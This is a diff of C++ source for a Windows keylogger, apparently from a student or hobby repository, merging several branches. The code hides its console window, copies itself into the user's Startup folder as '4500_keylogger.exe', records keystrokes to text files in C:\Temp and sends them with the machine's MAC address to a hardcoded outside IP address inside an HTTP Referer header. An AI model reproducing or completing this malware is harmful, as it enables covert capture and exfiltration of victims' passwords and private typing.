@@ -1,39 +1,46 @@
-<<<<<<< HEAD
-<<<<<<< HEAD
 #define _WINSOCK_DEPCRECATED 
 #include "stdafx.h"
 #include <winsock2.h>
-=======
-#include "stdafx.h"
-#pragma comment(lib, "ws2_32.lib")
-
->>>>>>> Merge_mij992900
 #include <iostream>
 #include <windows.h>
 #include <winuser.h>   
 #include <string.h>
 #include <stdlib.h>
-<<<<<<< HEAD
+#include <direct.h>
+#include <winSock.h>
+#include <IPHlpApi.h>
+#include <stdio.h>
+
+#pragma comment(lib, "iphlpapi.lib" )
 #pragma comment(lib, "ws2_32.lib")
 
 #define ip "35.193.14.199"
+#define MSIZE 16777216
+
 using namespace std;
+int Save(int key_stroke, char *file);// Function to write in notepad
+void Stealth();// Functions to hide the console
+char* user_Address();// Functions that load mac_address
+int fileCopy(const char* src, const char* dst);// Functions to copy files
+int start_program(char *start);// Functions that register as startup programs
+void file_name(char *old, int cnt);// Function to rename Notepad
+void txt_reset();// Functions to initialize Notepad
+int send_textfile(char *mac, char *log);// Function to send the contents of notepad
 
-void file_name(char *old, int cnt);
-void txt_reset();
-int Save(int key_stroke, char *file);
-void Stealth();
-int send_textfile(char *mac, char *log);
-
-int main(int argc, char** argv))
+//main
+int main(int argc, char** argv)
 {
-	char i, mac_address[100] = "00:03:FF"; // A function that accepts a Mac address is being implemented
-	int textcnt = 0, notepadcnt = 0; // We implemented 10 temporary text files
+	char i, mac_address[100];
+	int textcnt = 0, notepadcnt = 0;
 	char txtname[14] = "C:\\Temp\\0.txt";
 	char log[256];
-	char *start = argv[0];
 	Stealth();
+	start_program(argv[0]);
 	txt_reset();
+	FILE *mf = fopen("C:\\Temp\\UserMac.txt", "w+");
+	fclose(mf);
+	strcpy(mac_address, user_Address());
+
 	while (1)
 	{
 		for (i = 8; i <= 190; i++)
@@ -67,6 +74,7 @@ int main(int argc, char** argv))
 	return 0;
 }
 
+//file_name
 void file_name(char *tname, int ncnt) //change notepad name, example 0.txt 1.txt ... 9.txt
 {
 	char *tfile_num = &tname[8];
@@ -74,6 +82,7 @@ void file_name(char *tname, int ncnt) //change notepad name, example 0.txt 1.txt
 		(*tfile_num)++;
 }
 
+//txt_reset
 void txt_reset() //Initialize the contents of Notepad
 {
 	char tname[14] = "C:\\Temp\\0.txt";
@@ -88,18 +97,8 @@ void txt_reset() //Initialize the contents of Notepad
 	}
 }
 
-int Save(int key_stroke, char *file) //Save the text in Notepad
-=======
-#include<WinSock.h>
-#include<IPHlpApi.h>
-#pragma comment(lib, "iphlpapi.lib" )
-
-using namespace std;
-int Save(int key_stroke, char *file);
-void Stealth();
-
-
-void user_Address()//mac_address 불러오는 함수
+// user_address
+char* user_Address()
 {
 	char strMac[256];
 	char username[500] = "C:\\Temp\\UserMac.txt";
@@ -109,8 +108,8 @@ void user_Address()//mac_address 불러오는 함수
 	DWORD size = sizeof(PIP_ADAPTER_INFO);
 	PIP_ADAPTER_INFO Info;
 	ZeroMemory(&Info, size);
-	int result = GetAdaptersInfo(Info, &size);//첫번째 랜카드 Mac adrress 가져오기
-	if (result == ERROR_BUFFER_OVERFLOW)//getadaptersinfo가 메모리 부족하면 재할당하고 재호출
+	int result = GetAdaptersInfo(Info, &size);// Get the Mac address of the first Ran Card
+	if (result == ERROR_BUFFER_OVERFLOW)// If getadaptersinfo is out of memory, reallocate and recall
 	{
 		Info = (PIP_ADAPTER_INFO)malloc(size);
 		GetAdaptersInfo(Info, &size);
@@ -118,31 +117,23 @@ void user_Address()//mac_address 불러오는 함수
 
 	sprintf(strMac, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",
 		Info->Address[0], Info->Address[1], Info->Address[2], Info->Address[3], Info->Address[4], Info->Address[5]);
-
 	fprintf(OUTPUT_FILE, "%s", strMac);
 	fclose(OUTPUT_FILE);
+	return strMac;
 }
 
-
-int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
->>>>>>> Merge_mij992900
+// save
+int Save(int key_stroke, char *file)//Save typed text to txt file
 {
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0;
 
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
-
-	cout << key_stroke << endl;
-
 	if (key_stroke == 8)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 	else if (key_stroke == 13)
-<<<<<<< HEAD
-		fprintf(OUTPUT_FILE, "%s", "\n");
-=======
 		fprintf(OUTPUT_FILE, "%s", "[Enter]");
->>>>>>> Merge_mij992900
 	else if (key_stroke == 32)
 		fprintf(OUTPUT_FILE, "%s", " ");
 	else if (key_stroke == VK_TAB)
@@ -167,8 +158,6 @@ int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
 		fprintf(OUTPUT_FILE, "%s", ".");
-<<<<<<< HEAD
-=======
 	else if (key_stroke == 186)
 		fprintf(OUTPUT_FILE, "%s", "@");
 	else if (key_stroke >= 96 && key_stroke <= 105)
@@ -183,25 +172,22 @@ int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
 		fprintf(OUTPUT_FILE, "%s", ".");
 	else if (key_stroke == 111)
 		fprintf(OUTPUT_FILE, "%s", "/");
->>>>>>> Merge_mij992900
 	else
 		fprintf(OUTPUT_FILE, "%s", &key_stroke);
 	fclose(OUTPUT_FILE);
 	return 0;
 }
-<<<<<<< HEAD
-void Stealth()
-=======
-void Stealth()//콘솔창 숨기기
->>>>>>> Merge_mij992900
+
+// Stealth
+void Stealth()// Hide console
 {
 	HWND Stealth;
 	AllocConsole();
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(Stealth, 0);
-<<<<<<< HEAD
 }
 
+// send text
 int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of txtfile
 {
 	char text[10000] = "";
@@ -210,14 +196,12 @@ int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of
 	char server_host[10000] = "Host: 35.193.14.199 \r\n";
 	char referer[10000] = "Referer:";
 	char finish[10000] = "Connection: close\r\n\r\n";
-
 	char *macp = mac;
+
 	for (; *macp; macp++)
-	{
 		if (*macp == ':')
 			*macp = '!';
-	}
-	printf("\n%s\n", mac);
+
 	strcat(text, mac); strcat(text, "<identity>"); strcat(text, log);
 	strcat(referer, text); strcat(referer, "\r\n");
 	strcat(trans, static_1);
@@ -253,79 +237,79 @@ int send_textfile(char *mac, char *log) //mac == mac_address, log == contents of
 		system("pause");
 		return 1;
 	}
+
 	cout << "Connected.\n";
-
 	send(Socket, trans, strlen(trans), 0);
-
 	char buffer[10000];
 	int nDataLength;
 
 	while ((nDataLength = recv(Socket, buffer, 10000, 0)) > 0) {
 		int i = 0;
-		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r') {
-			cout << buffer[i];
+		while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r')
 			i += 1;
-		}
 	}
 	closesocket(Socket);
 	WSACleanup();
-	//system("pause");
+
 	return 0;
-=======
->>>>>>> Merge_mij992900
 }
-=======
-#include <direct.h>
 
-#define MSIZE 16777216
-
+// file copy
 int fileCopy(const char* src, const char* dst) {
-  FILE *in, *out;
-  char* buf;
-  size_t len;
+	FILE *in, *out;
+	char* buf;
+	size_t len;
 
-  if (!strcmpi(src, dst)) return 4; // 원본과 사본 파일이 동일하면 에러
+	printf("%s\n", src);
+	printf("%s\n", dst);
 
-  if ((in  = fopen(src, "rb")) == NULL) return 1; // 원본 파일 열기
-  if ((out = fopen(dst, "wb")) == NULL) { fclose(in); return 2; } // 대상 파일 만들기
+	if (!strcmpi(src, dst)) return 4; // 원본과 사본 파일이 동일하면 에러
 
-  if ((buf = (char *) malloc(MSIZE)) == NULL) { fclose(in); fclose(out); return 10; } // 버퍼 메모리 할당
+	if ((in = fopen(src, "rb")) == NULL) {
+		return 1; // 원본 파일 열기
+	}
+	if ((out = fopen(dst, "wb")) == NULL) {
+		fclose(in);
+		return 2;
+	} // 대상 파일 만들기
 
-  while ( (len = fread(buf, sizeof(char), sizeof(buf), in)) != NULL )
-    if (fwrite(buf, sizeof(char), len, out) == 0) {
-      fclose(in); fclose(out);
-      free(buf);
-      _unlink(dst); // 에러난 파일 지우고 종료
-      return 3;
-    }
+	if ((buf = (char *)malloc(MSIZE)) == NULL) { fclose(in); fclose(out); return 10; } // 버퍼 메모리 할당
 
-  fclose(in); fclose(out);
-  free(buf); // 메모리 할당 해제
+	while ((len = fread(buf, sizeof(char), sizeof(buf), in)) != NULL)
+	{
+		if (fwrite(buf, sizeof(char), len, out) == 0) {
+			fclose(in); fclose(out);
+			free(buf);
+			_unlink(dst); // 에러난 파일 지우고 종료
+			return 3;
+		}
+	}
 
-  return 0;
+	fclose(in); fclose(out);
+	free(buf); // 메모리 할당 해제
+
+	return 0;
 }
 
-int start_program(char *star){
+// start_program 
+int start_program(char *start) {
 	char a[1024];
 	char *real_user_name;
 	char *checking_user_name;
 	int count = 0;
-
+	char startadd[1000];
+	strcpy(startadd, start);
 	checking_user_name = strstr(start, "Users\\") + 6;
 	real_user_name = strstr(checking_user_name, "\\") + 1;
 
-	while(start != real_user_name){
+	while (start != real_user_name) {
 		a[count] = *start;
 		start++;
 		count++;
 	}
 	a[count] = NULL;
-	strcat(a, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe");
-
-	count = fileCopy(argv[0], a);
-
-	system("pause");
+	strcat(a, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\4500_keylogger.exe");
+	count = fileCopy(startadd, a);
 
 	return 0;
 }
->>>>>>> merge_startprogram
